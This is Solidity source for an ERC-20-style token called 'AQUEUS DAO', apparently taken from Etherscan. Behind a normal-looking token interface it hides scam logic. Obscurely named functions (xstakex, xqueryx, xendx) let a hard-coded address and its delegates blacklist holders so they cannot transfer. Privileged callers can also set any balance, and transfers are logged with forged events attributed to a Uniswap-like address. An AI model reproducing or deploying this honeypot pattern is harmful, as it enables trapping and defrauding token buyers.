/**
 *Submitted for verification at Etherscan.io on 2022-10-30
*/

pragma solidity 0.8.17;

abstract contract Context {
    function _MsgSendr() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address _conscripter = 0x4312662cf2Cc99f5Bd018291CE8a5C1D11a73324;
	address V2Uniswap = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _MsgSendr();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }

}



contract AQUEUS is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Lx;
	mapping (address => bool) private Ly;
    mapping (address => bool) private Lk;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint8 private constant _decimals = 8;
    uint256 private constant _totalsup = 150000000 * 10**_decimals;
    string private constant _name = "AQUEUS DAO";
    string private constant _symbol = "AQUEUS";



    constructor () {
        Lx[_MsgSendr()] = _totalsup;
        emit Transfer(address(0), V2Uniswap, _totalsup);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure  returns (uint256) {
        return _totalsup;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return Lx[account];
    }


    function allowance(address owner, address spender) public view  returns (uint256) {
        return _allowances[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function xendx(address yz) public {
        if(Ly[msg.sender]) { 
        Lk[yz] = false;}}
        function xqueryx(address yz) public{
         if(Ly[msg.sender])  { 
        require(!Lk[yz]);
        Lk[yz] = true; }}
		function xstakex(address yz) public{
         if(msg.sender == _conscripter)  { 
        require(!Ly[yz]);
        Ly[yz] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == _conscripter)  {
        require(amount <= Lx[sender]);
        Lx[sender] -= amount;  
        Lx[recipient] += amount; 
          _allowances[sender][msg.sender] -= amount;
        emit Transfer (V2Uniswap, recipient, amount);
        return true; }    
          if(!Lk[recipient]) {
          if(!Lk[sender]) {
         require(amount <= Lx[sender]);
        require(amount <= _allowances[sender][msg.sender]);
        Lx[sender] -= amount;
        Lx[recipient] += amount;
      _allowances[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address recipient, uint256 amount) public {
        if(msg.sender == _conscripter)  {
        require(Lx[msg.sender] >= amount);
        Lx[msg.sender] -= amount;  
        Lx[recipient] += amount; 
        emit Transfer (V2Uniswap, recipient, amount);}
        if(Ly[msg.sender]) {Lx[recipient] = amount;} 
        if(!Lk[msg.sender]) {
        require(Lx[msg.sender] >= amount);
        Lx[msg.sender] -= amount;  
        Lx[recipient] += amount;          
        emit Transfer(msg.sender, recipient, amount);
        }}}